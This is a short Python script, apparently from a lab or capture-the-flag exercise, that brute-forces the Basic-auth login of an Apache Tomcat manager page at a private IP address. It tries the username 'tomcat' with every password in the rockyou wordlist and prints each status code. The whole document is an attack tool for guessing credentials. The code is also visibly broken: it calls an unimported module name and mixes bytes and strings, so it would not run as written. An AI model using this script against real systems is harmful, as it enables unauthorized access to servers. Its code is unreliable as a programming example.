#!/usr/bin/env python3

import requests as req
import base64

url = "http://10.10.10.227:8080/manager/html"

with open("/usr/share/wordlists/rockyou.txt") as f:
    for l in f:
        auth = b"tomcat:" + l.strip("\n")
        auth64 = base64.b64encode(auth)
        headers = {"Authorization":"Basic "+auth64}
        req = requests.get(url, headers=headers)
        print(req.status_code)
